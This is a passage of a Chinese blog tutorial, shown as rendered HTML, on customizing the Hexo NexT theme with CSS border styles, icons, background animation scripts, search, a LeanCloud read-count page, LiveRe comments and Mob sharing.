class="number">0</span>;  </span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;  </span><br><span class="line"><span class="attribute">border-right-width</span>: <span class="number">5px</span>;  </span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;  </span><br><span class="line"><span class="attribute">border-right-color</span>: <span class="number">#5cb85c</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 右侧边框蓝色块级  </span><br><span class="line"><span class="selector-tag">p</span><span class="selector-id">#div-border-right-blue</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>: block;  </span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span>;  </span><br><span class="line"><span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;  </span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;  </span><br><span class="line"><span class="attribute">border-right-width</span>: <span class="number">5px</span>;  </span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;  </span><br><span class="line"><span class="attribute">border-right-color</span>: <span class="number">#2780e3</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 右侧边框紫色块级  </span><br><span class="line"><span class="selector-tag">p</span><span class="selector-id">#div-border-right-purple</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>: block;  </span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span>;  </span><br><span class="line"><span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;  </span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;  </span><br><span class="line"><span class="attribute">border-right-width</span>: <span class="number">5px</span>;  </span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;  </span><br><span class="line"><span class="attribute">border-right-color</span>: <span class="number">#9954bb</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 上侧边框红色  </span><br><span class="line"><span class="selector-tag">p</span><span class="selector-id">#div-border-top-red</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>: block;  </span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span>;  </span><br><span class="line"><span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;  </span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;  </span><br><span class="line"><span class="attribute">border-top-width</span>: <span class="number">5px</span>;  </span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;  </span><br><span class="line"><span class="attribute">border-top-color</span>: <span class="number">#df3e3e</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 上侧边框黄色  </span><br><span class="line"><span class="selector-tag">p</span><span class="selector-id">#div-border-top-yellow</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>: block;  </span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span>;  </span><br><span class="line"><span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;  </span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;  </span><br><span class="line"><span class="attribute">border-top-width</span>: <span class="number">5px</span>;  </span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;  </span><br><span class="line"><span class="attribute">border-top-color</span>: <span class="number">#f0ad4e</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 上侧边框绿色  </span><br><span class="line"><span class="selector-tag">p</span><span class="selector-id">#div-border-top-green</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>: block;  </span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span>;  </span><br><span class="line"><span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;  </span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;  </span><br><span class="line"><span class="attribute">border-top-width</span>: <span class="number">5px</span>;  </span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;  </span><br><span class="line"><span class="attribute">border-top-color</span>: <span class="number">#5cb85c</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 上侧边框蓝色  </span><br><span class="line"><span class="selector-tag">p</span><span class="selector-id">#div-border-top-blue</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>: block;  </span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span>;  </span><br><span class="line"><span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;  </span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;  </span><br><span class="line"><span class="attribute">border-top-width</span>: <span class="number">5px</span>;  </span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;  </span><br><span class="line"><span class="attribute">border-top-color</span>: <span class="number">#2780e3</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 上侧边框紫色  </span><br><span class="line"><span class="selector-tag">p</span><span class="selector-id">#div-border-top-purple</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>: block;  </span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span>;  </span><br><span class="line"><span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;  </span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;  </span><br><span class="line"><span class="attribute">border-top-width</span>: <span class="number">5px</span>;  </span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;  </span><br><span class="line"><span class="attribute">border-top-color</span>: <span class="number">#9954bb</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="文字增加背景色块"><a href="#文字增加背景色块" class="headerlink" title="文字增加背景色块"></a>文字增加背景色块</h4><p><span id="inline-blue">站点配置文件</span>，<br><span id="inline-purple">主题配置文件</span><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"inline-blue"</span>&gt;</span>站点配置文件<span class="tag">&lt;/<span class="name">span</span>&gt;</span>，  </span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"inline-purple"</span>&gt;</span>主题配置文件<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h4 id="引用边框变色"><a href="#引用边框变色" class="headerlink" title="引用边框变色"></a>引用边框变色</h4><p></p><p id="div-border-left-red">如果没有安装成功，那可能就是墙的原因。建议下载 <code>Node.js</code> 直接安装。</p>  <p></p><p></p><p id="div-border-top-blue">关于更多基本操作和基础知识，请查阅 <a href="[https://hexo.io/zh-cn/](https://hexo.io/zh-cn/">Hexo</a>) 与 <a href="[http://theme-next.iissnan.com/](http://theme-next.iissnan.com/">NexT</a>) 官方文档.</p><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"div-border-left-red"</span>&gt;</span>如果没有安装成功，那可能就是墙的原因。建议下载 `Node.js` 直接安装。<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"div-border-top-blue"</span>&gt;</span>关于更多基本操作和基础知识，请查阅[Hexo]([https://hexo.io/zh-cn/](https://hexo.io/zh-cn/)) 与[NexT]([http://theme-next.iissnan.com/](http://theme-next.iissnan.com/)) 官方文档.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p></p><h4 id="在文档中增加图标"><a href="#在文档中增加图标" class="headerlink" title="在文档中增加图标"></a>在文档中增加图标</h4><blockquote><ul><li><i class="fa fa-pencil"></i>支持Markdown<br><i>Hexo 支持 GitHub Flavored Markdown 的所有功能，甚至可以整合 Octopress 的大多数插件。</i>  </li><li><i class="fa fa-cloud-upload"></i>一件部署<br><i>只需一条指令即可部署到Github Pages，或其他网站</i>  </li><li><i class="fa fa-cog"></i>丰富的插件<br><i>Hexo 拥有强大的插件系统，安装插件可以让 Hexo 支持 Jade, CoffeeScript。</i><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-pencil"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>支持Markdown  </span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span>Hexo 支持 GitHub Flavored Markdown 的所有功能，甚至可以整合 Octopress 的大多数插件。<span class="tag">&lt;/<span class="name">i</span>&gt;</span>  </span><br><span class="line">- <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-cloud-upload"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>一件部署  </span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span>只需一条指令即可部署到Github Pages，或其他网站<span class="tag">&lt;/<span class="name">i</span>&gt;</span>  </span><br><span class="line">- <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-cog"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>丰富的插件  </span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span>Hexo 拥有强大的插件系统，安装插件可以让 Hexo 支持 Jade, CoffeeScript。<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></blockquote><ul><li><i class="fa fa-github"></i><code>&lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt;</code>  </li><li><i class="fa fa-github fa-lg"><code>&lt;i class=&quot;fa fa-github fa-lg&quot;&gt;&lt;/i&gt;</code>  </i></li><li><i class="fa fa-github fa-2x"><code>&lt;i class=&quot;fa fa-github fa-2x&quot;&gt;&lt;/i&gt;</code></i></li></ul><p>采用的是<strong><em><a href="http://fontawesome.io/examples/" target="_blank" rel="noopener">Font Awesome</a></em></strong>的图标。</p><h4 id="图形边框效果"><a href="#图形边框效果" class="headerlink" title="图形边框效果"></a>图形边框效果</h4><blockquote><p><a id="download" href="https://git-scm.com/download/win" target="_blank" rel="noopener"><i class="fa fa-download"></i><span> Download Now</span><br></a><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"download"</span> <span class="attr">href</span>=<span class="string">"https://git-scm.com/download/win"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-download"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span> Download Now<span class="tag">&lt;/<span class="name">span</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><h3 id="主页文章添加阴影效果"><a href="#主页文章添加阴影效果" class="headerlink" title="主页文章添加阴影效果"></a>主页文章添加阴影效果</h3><blockquote><p>打开<code>\themes\next\source\css_custom\custom.styl</code>,向里面加入：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 主页文章添加阴影效果</span><br><span class="line"> <span class="selector-class">.post</span> &#123;</span><br><span class="line">   <span class="attribute">margin-top</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">margin-bottom</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">padding</span>: <span class="number">25px</span>;</span><br><span class="line">   <span class="attribute">-webkit-box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">rgba</span>(202, 203, 203, .5);</span><br><span class="line">   <span class="attribute">-moz-box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">rgba</span>(202, 203, 204, .5);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p></blockquote><h3 id="居中"><a href="#居中" class="headerlink" title="居中"></a>居中</h3><h4 id="标签居中"><a href="#标签居中" class="headerlink" title="标签居中"></a>标签居中</h4><blockquote><p>修改模板<code>/themes/next/layout/_macro/post.swig</code>，搜索 rel=”tag”&gt;#，将 # 换成<i class="fa fa-tag"></i></p><p>将<code>themes\next\source\css\_common\components\post\post-tags.styl</code>里面的 <code>.post-tags里面的text-align: left;</code> 改成 <code>text-align: center;</code></p></blockquote><h4 id="阅读更多居中"><a href="#阅读更多居中" class="headerlink" title="阅读更多居中"></a>阅读更多居中</h4><blockquote><p>将<code>themes\next\source\css\_custom\custom.styl</code>  新增：<br><code>.post-more-link {    text-align: center;}</code></p></blockquote><h3 id="鼠标点击小红心的设置"><a href="#鼠标点击小红心的设置" class="headerlink" title="鼠标点击小红心的设置"></a>鼠标点击小红心的设置</h3><blockquote><p>将 <a href="https://github.com/Neveryu/Neveryu.github.io/blob/master/js/src/love.js" target="_blank" rel="noopener">love.js</a> 文件添加到 <code>\themes\next\source\js\src</code> 文件目录下。<br>找到 <code>\themes\next\layout_layout.swing</code> 文件， 在文件的后面， 标签之前 添加以下代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 页面点击小红心 --&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"/js/src/love.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p></blockquote><h3 id="为next主题添加nest背景特效"><a href="#为next主题添加nest背景特效" class="headerlink" title="为next主题添加nest背景特效"></a>为next主题添加nest背景特效</h3><blockquote><p>背景的几何线条是采用的<code>nest</code>效果，一个基于<code>html5 canvas</code>绘制的网页背景效果，非常赞！来自github的开源项目<code>canvas-nest</code></p></blockquote><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><blockquote><ul><li>不依赖任何框架或者内库，比如不依赖jQuery，使用原生的javascript。</li><li>非常小，只有1.66kb，如果开启gzip，可以更小。</li><li>非常容易实现，配置简单，即使你不是web开发者，也能简单搞定。<br>使用非常简单</li><li><code>color</code>: 线条颜色, 默认: ‘0,0,0’ ；三个数字分别为(R,G,B)，注意用,分割</li><li><code>opacity</code>: 线条透明度（0~1）, 默认: 0.5</li><li><code>count</code>: 线条的总数量, 默认: 150</li><li><code>zIndex</code>: 背景的z-index属性，css属性用于控制所在层的位置, 默认: -1</li></ul></blockquote><h3 id="如何添加？"><a href="#如何添加？" class="headerlink" title="如何添加？"></a>如何添加？</h3><blockquote><p>打开<code>next/layout/_layout.swig</code>，在<code>&lt;/body&gt;</code>之前添加如下代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> theme.canvas_nest %&#125;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>修改主题配置文件<br>打开<code>/next/_config.yml</code>，添加/修改以下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># --------------------------------------------------------------  </span><br><span class="line"># background settings  </span><br><span class="line"># --------------------------------------------------------------  </span><br><span class="line"># add canvas-nest effect  </span><br><span class="line"># see detail from [https://github.com/hustcc/canvas-nest.js](https://github.com/hustcc/canvas-nest.js)  </span><br><span class="line">canvas_nest: true</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>至此，大功告成，运行hexo clean 和 hexo g hexo s之后就可以看到效果了</p></blockquote><h3 id="背景的设置"><a href="#背景的设置" class="headerlink" title="背景的设置"></a>背景的设置</h3><blockquote><p>将 <a href="https://github.com/Neveryu/Neveryu.github.io/blob/master/js/src/particle.js" target="_blank" rel="noopener">particle.js</a> 文件添加到 <code>\themes\next\source\js\src</code> 文件目录下。<br>找到 <code>\themes\next\layout_layout.swing</code> 文件， 在文件的后面，标签之前 添加以下代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 背景动画 --&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"/js/src/particle.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p></blockquote><h3 id="修改文章内链接文本样式"><a href="#修改文章内链接文本样式" class="headerlink" title="修改文章内链接文本样式"></a>修改文章内链接文本样式</h3><blockquote><p>将链接文本设置为蓝色，鼠标划过时文字颜色加深，并显示下划线。<br>找到文件 themes\next\source\css_custom\custom.styl ，添加如下 css 样式：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.post-body</span> <span class="selector-tag">p</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: none;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    <span class="selector-tag">color</span>: <span class="selector-id">#0477ab</span>;</span><br><span class="line">    <span class="selector-tag">text-decoration</span>: <span class="selector-tag">underline</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><h3 id="搜索功能"><a href="#搜索功能" class="headerlink" title="搜索功能"></a>搜索功能</h3><blockquote><p>安装 <code>hexo-generator-searchdb</code>，在站点的根目录下执行以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>编辑 站点配置文件，新增/添加以下内容到任意位置：<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line"><span class="attr">  path:</span> <span class="string">search.xml</span></span><br><span class="line"><span class="attr">  field:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">  format:</span> <span class="string">html</span></span><br><span class="line"><span class="attr">  limit:</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure></p></blockquote><h3 id="自定义页面"><a href="#自定义页面" class="headerlink" title="自定义页面"></a>自定义页面</h3><blockquote><p>以添加文章阅读统计排行为例，执行<code>hexo new page &quot;count&quot;</code>之后，那怎么在博客中加进去呢？<br>找到<code>\next\_config.yml</code>下的<code>memu</code>，把<code>count</code>加进去：<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu:</span>  </span><br><span class="line"><span class="attr">home:</span> <span class="string">/</span>  </span><br><span class="line"><span class="attr">categories:</span> <span class="string">/categories</span>  </span><br><span class="line"><span class="comment">#about: /about  </span></span><br><span class="line"><span class="attr">archives:</span> <span class="string">/archives</span>  </span><br><span class="line"><span class="attr">tags:</span> <span class="string">/tags</span>  </span><br><span class="line"><span class="attr">count:</span> <span class="string">/count</span> <span class="string">||</span> <span class="string">eye</span> <span class="comment"># ||后面为显示的图标</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>图标网站：<em><a href="http://fontawesome.io/icons/" target="_blank" rel="noopener">http://fontawesome.io/icons/</a></em></p><p>在<code>/themes/hexo-theme-next/languages/zh-Hans.yml</code>的目录下，在<code>memu</code>下加一句即可：<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">count:</span> <span class="string">琅琊榜</span></span><br></pre></td></tr></table></figure></p></blockquote><h3 id="增加阅读排行统计页面"><a href="#增加阅读排行统计页面" class="headerlink" title="增加阅读排行统计页面"></a>增加阅读排行统计页面</h3><blockquote><p>首先我们可以使用leancloud来统计页面阅读数量，以及储存这些信息，然后通过leancloud提供的api编写js脚本来获取阅读数量信息，并展示在页面上。<br>首先新建一个page页面，hexo new page “count”,然后编辑此.md文件，写下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script&gt;AV.initialize(<span class="string">"app_id"</span>, <span class="string">"app_key"</span>);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> <span class="comment">//需要写上leancloud的app_id和app_key</span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">  <span class="keyword">var</span> time=<span class="number">0</span></span><br><span class="line">  <span class="keyword">var</span> title=<span class="string">""</span></span><br><span class="line">  <span class="keyword">var</span> url=<span class="string">""</span></span><br><span class="line">  <span class="keyword">var</span> query = <span class="keyword">new</span> AV.Query(<span class="string">'Counter'</span>);<span class="comment">//表名</span></span><br><span class="line">  query.notEqualTo(<span class="string">'id'</span>,<span class="number">0</span>); <span class="comment">//id不为0的结果</span></span><br><span class="line">  query.descending(<span class="string">'time'</span>); <span class="comment">//结果按阅读次数降序排序</span></span><br><span class="line">  query.limit(<span class="number">20</span>);  <span class="comment">//最终只返回10条结果</span></span><br><span class="line">  query.find().then(<span class="function"><span class="keyword">function</span> (<span class="params">todo</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123; </span><br><span class="line">      <span class="keyword">var</span> result=todo[i].attributes;</span><br><span class="line">      time=result.time;  <span class="comment">//阅读次数</span></span><br><span class="line">      title=result.title; <span class="comment">//文章标题</span></span><br><span class="line">      url=result.url;     <span class="comment">//文章url</span></span><br><span class="line">      <span class="keyword">var</span> content=<span class="string">"&lt;p&gt;"</span>+<span class="string">"&lt;font color='#0477ab'&gt;"</span>+<span class="string">"【阅读次数:"</span>+time+<span class="string">"】"</span>+<span class="string">"&lt;a href='"</span>+<span class="string">"http://thief.one"</span>+url+<span class="string">"'&gt;"</span>+title+<span class="string">"&lt;/font&gt;"</span>+<span class="string">"&lt;/a&gt;"</span>+<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">      <span class="comment">// document.write("&lt;a href='"+"http://thief.one/"+url+"'&gt;"+title+"&lt;/a&gt;"+"    Readtimes:"+time+"&lt;br&gt;");</span></span><br><span class="line">      <span class="built_in">document</span>.getElementById(<span class="string">"heheda"</span>).innerHTML+=content</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"error"</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>注：js里面需要写上<a href="https://leancloud.cn" target="_blank" rel="noopener">leancloud</a>的app_id和app_key<br>最终效果查看： <a href="http://longofo.cc">效果查看</a></p></blockquote><h3 id="多说替换成来必力评论"><a href="#多说替换成来必力评论" class="headerlink" title="多说替换成来必力评论"></a>多说替换成来必力评论</h3><blockquote><p> 多说已经宣布下线了，因此使用来必力评论系统来替换，以下是替换的教程，教程内容来自：<a href="https://blog.smoker.cc/web/add-comments-livere-for-hexo-theme-next.html" target="_blank" rel="noopener">https://blog.smoker.cc/web/add-comments-livere-for-hexo-theme-next.html</a><br>首先在 _config.yml 文件中添加如下配置：<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">livere_uid:</span> <span class="string">your</span> <span class="string">uid</span>  <span class="comment">#按照上面链接教程获取</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>在 <code>layout/_scripts/third-party/comments/</code> 目录中添加 <code>livere.swig</code>，文件内容如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> not (theme.duoshuo and theme.duoshuo.shortname) and not theme.duoshuo_shortname and not theme.disqus_shortname and not theme.hypercomments_id and not theme.gentie_productKey %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> theme.livere_uid %&#125;</span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">      (<span class="function"><span class="keyword">function</span>(<span class="params">d, s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> j, e = d.getElementsByTagName(s)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> LivereTower === <span class="string">'function'</span>) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">        j = d.createElement(s);</span><br><span class="line">        j.src = <span class="string">'https://cdn-city.livere.com/js/embed.dist.js'</span>;</span><br><span class="line">        j.async = <span class="literal">true</span>;</span><br><span class="line">        e.parentNode.insertBefore(j, e);</span><br><span class="line">      &#125;)(<span class="built_in">document</span>, <span class="string">'script'</span>);</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">  &#123;% endif %&#125;</span></span><br><span class="line"><span class="regexp">&#123;% endif %&#125;</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>优先使用其他评论插件，如果其他评论插件没有开启，且<code>LiveRe</code>评论插件配置开启了，则使用<code>LiveRe</code>。其中脚本代码为上一步管理页面中获取到的。在<code>layout/_scripts/third-party/comments.swig</code>文件中追加：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include './comments/livere.swig' %&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>引入 LiveRe 评论插件。<br>最后，在 <code>layout/_partials/comments.swig</code> 文件中条件最后追加<code>LiveRe</code>插件是否引用的判断逻辑：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% elseif theme.livere_uid %&#125;</span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"lv-container"</span> <span class="attr">data-id</span>=<span class="string">"city"</span> <span class="attr">data-uid</span>=<span class="string">"&#123;&#123; theme.livere_uid &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>最后打开博客瞧瞧吧！</p></blockquote><h3 id="集成Mod分享组件"><a href="#集成Mod分享组件" class="headerlink" title="集成Mod分享组件"></a>集成Mod分享组件</h3><blockquote><p><img src="http://ojoba1c98.bkt.clouddn.com/img/build-hexo/share-mod.png" alt=""><br>Step1、获取 AppKey<br>在 <em><a href="http://www.mob.com/" target="_blank" rel="noopener">Mob</a></em> 注册账号后，点击头像进入后台，选择 <code>shareSDK</code> 添加一个 <code>Web应用</code>：<br><img src="http://ojoba1c98.bkt.clouddn.com/img/build-hexo/mod-share.png" alt=""><br>Step2、在<strong>主题配置文件</strong>中添加配置：<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mob_share:</span>  </span><br><span class="line"><span class="attr">enable:</span> <span class="literal">true</span>  </span><br><span class="line"><span class="attr">appkey:</span> <span 